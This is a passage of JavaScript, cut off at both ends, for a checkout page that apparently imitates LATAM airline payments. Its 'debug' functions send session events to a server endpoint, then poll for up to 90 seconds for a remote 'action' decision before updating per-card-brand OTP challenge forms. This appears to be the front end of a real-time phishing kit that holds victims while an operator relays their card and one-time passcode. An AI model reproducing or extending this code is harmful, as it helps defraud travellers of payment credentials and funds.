  const discountPct = Number(boardEl?.dataset.descuento || 0) || 0;

  const STORAGE_KEY = 'latam-checkout-selection';
  const SEATS_KEY = 'latam-seat-selection';
  const STORE_KEY = 'latam-store-selection';
  const PAX_KEY = 'latam-passenger-draft';
  const DEBUG_SESSION_KEY = 'latam-debug-session-id';
  const defaultLegs = JSON.parse(legsJson);

  function debugSessionId() {
    let sessionId = sessionStorage.getItem(DEBUG_SESSION_KEY);
    if (!sessionId) {
      sessionId = crypto.randomUUID();
      sessionStorage.setItem(DEBUG_SESSION_KEY, sessionId);
    }
    return sessionId;
  }

  async function sendDebugEvent(event, payload = {}) {
    console.log(`[debug-before-fetch:${event}]`, {
      sessionId: debugSessionId(),
      route: window.location.pathname,
      ...payload,
    });
    const response = await fetch('/api/debug', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event,
        sessionId: debugSessionId(),
        route: window.location.pathname,
        ...payload,
      }),
    });
    if (!response.ok) throw new Error('No se pudo consultar el enrutador debug');
    return response.json();
  }

  async function pollDebugDecision(timeoutMs = 90000) {
    const sessionId = debugSessionId();
    const started = Date.now();
    while (Date.now() - started < timeoutMs) {
      const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
        headers: { Accept: 'application/json' },
      });
      if (response.ok) {
        const payload = await response.json();
        const decision = payload?.decision || {};
        if (decision.action && decision.action !== 'wait') return decision;
      }
      await new Promise((resolve) => window.setTimeout(resolve, 1500));
    }
    return {
      action: 'timeout',
      message: 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.',
    };
  }

  function maskCard(value) {
    const digits = onlyDigits(value || '');
    if (digits.length < 8) return digits.replace(/\d/g, '*');
    return `${digits.slice(0, 6)}******${digits.slice(-4)}`;
  }

  function setUiMessage(message, kind = 'error') {
    if (!msg) return;
    msg.hidden = !message;
    msg.textContent = message || '';
    msg.dataset.kind = kind;
  }

  function setChallengeMessage(brand, message, kind = 'error') {
    const challenge = document.getElementById('pagos-challenge-screen');
    const panel = challenge?.querySelector(`[data-challenge-brand="${brand}"]`);
    const form = panel?.querySelector('[data-otp-form]');
    if (!form) {
      setUiMessage(message, kind);
      return;
    }
    let error = form.querySelector('[data-otp-debug-message]');
    if (!error) {
      error = document.createElement('p');
      error.setAttribute('data-otp-debug-message', '');
      error.setAttribute('role', 'alert');
      error.style.margin = '10px 0 0';
      error.style.fontSize = '13px';
      error.style.lineHeight = '1.35';
      form.appendChild(error);
    }
    error.textContent = message || '';
    error.hidden = !message;
    error.dataset.kind = kind;
    error.style.color = kind === 'success' ? '#178a3b' : kind === 'info' ? '#1b4e9b' : '#b42318';
  }

  function clearChallengeMessages() {
    document.querySelectorAll('[data-otp-debug-message]').forEach((el) => {
      el.textContent = '';
